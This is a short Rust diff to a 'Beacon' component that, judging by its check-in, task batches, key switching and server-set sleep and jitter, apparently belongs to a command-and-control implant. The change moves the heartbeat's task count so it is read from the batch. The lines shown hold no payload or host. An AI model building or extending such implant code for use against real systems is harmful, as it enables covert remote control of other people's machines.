@@ -750,8 +750,14 @@ impl Beacon {
         // The heartbeat: the small frame that says "still here, this is
         // what I am".  It is sent after the batch, because a frame that
         // is sent between the check-in and the batch would be sealed with
-        // the old keys when the server has already switched.
-        self.send_heartbeat(tasks.len())?;
+        // the old keys when the server has already switched.  The count of
+        // the work is read from the batch itself: the tasks are unpacked
+        // further down, after the policy of the server has been applied.
+        let task_count = match batch.get("tasks") {
+            Some(Value::Arr(items)) => items.len(),
+            _ => 0,
+        };
+        self.send_heartbeat(task_count)?;
 
         // Server-side beacon policy wins over the compiled-in defaults.
         self.apply_policy(batch.u64_or("sleep", self.cfg.sleep), batch.u64_or("jitter", self.cfg.jitter as u64) as u32);
